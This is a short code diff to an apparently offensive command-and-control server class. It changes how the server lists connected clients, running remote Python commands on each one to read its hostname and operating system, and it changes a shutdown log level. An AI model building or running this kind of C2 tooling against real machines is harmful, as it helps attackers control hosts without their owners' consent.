@@ -105,19 +105,20 @@ class C2Server:
     def list_clients(self):
         self.remove_dead()
         if len(self.clients) > 0:
-            #Format: Hostname, ip, port, os
+            #Format: Hostname, ip, os
             nice_client_list = []
-            for index, client in self.clients:
+            seperator= ", "
+            for index, client in enumerate(self.clients):
                 self.select_client(index)
-                client_data = [
-                    client.gethostname(),                                        #Hostname
-                    client.getpeername(),                                        #Ip, Port
-                    self.send_command('python -c "import os; print(os.name)"')   #OS
-                ]
+                client_data = [self.send_command('python -c "import platform; print(platform.node())"')]  #Hostname
+                client_data.append(client.getpeername()[0]),                                              #Ip
+                client_data = list(client_data)                                     
+                client_data.append(self.send_command('python -c "import os; print(os.name)"'))            #OS
                 if client_data[2] == "nt":
                     client_data[2] = "Windows"
                 else:
-                    client_data[2] = "Linux / Other"
+                    client_data[2] = "Linux/Other"
+                client_data = seperator.join(client_data)
                 nice_client_list.append(client_data)
             return nice_client_list
         else:
@@ -134,7 +135,7 @@ if __name__ == "__main__":
     atexit.register(server.stop)
 
     def handle_sigint(sig, frame):
-        log.debug("Caught CTRL + C, Shutting Down")
+        log.info("Caught CTRL + C, Shutting Down")
         server.stop()
         exit(0)
     signal.signal(signal.SIGINT, handle_sigint)
